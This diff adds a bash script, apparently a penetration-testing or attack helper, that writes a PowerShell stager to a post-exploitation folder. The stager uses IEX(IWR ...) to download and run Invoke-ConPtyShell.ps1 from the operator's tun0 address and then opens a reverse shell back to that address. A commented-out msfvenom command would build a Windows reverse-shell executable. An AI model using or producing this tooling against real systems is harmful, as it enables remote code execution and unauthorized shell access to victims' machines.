@@ -1,0 +1,44 @@
+#!/bin/bash
+
+# Set options
+default_port="443"
+stage_script_path="/usr/local/share/post-exploitation/windows/privEsc"
+
+# Get port number if provided as argument, otherwise use default
+if [ $# -eq 1 ]; then
+    port=$1
+elif [ $# -eq 2 ]; then
+    port=$1
+    httpPort=$2
+else
+    port=$default_port
+    httpPort=""
+fi
+
+# Get current IP on tun0
+myip=$(ip addr show tun0 | grep -oP 'inet \K[\d.]+')
+
+# Concatenate IP address with HTTP port if provided
+if [ -n "$httpPort" ]; then
+    address="$myip:$httpPort"
+else
+    address="$myip"
+fi
+
+# PowerShell staging script content
+stage_script_content=$(cat <<EOF
+IEX(IWR http://$address/scripts/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $myip $port
+EOF
+)
+
+# Save the modified content to stage.ps1
+sudo bash -c "echo \"$stage_script_content\" > $stage_script_path/stage.ps1"
+
+# Notify the user
+echo "$stage_script_path/stage.ps1 updated with the current IP address of tun0: $myip and port: $port"
+echo 
+echo "stage.ps1 contents:"
+cat $stage_script_path/stage.ps1
+
+# generate venom shell bin payload
+#sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=$port -f exe -o $stage_script_path/bin/shell$port.exe 
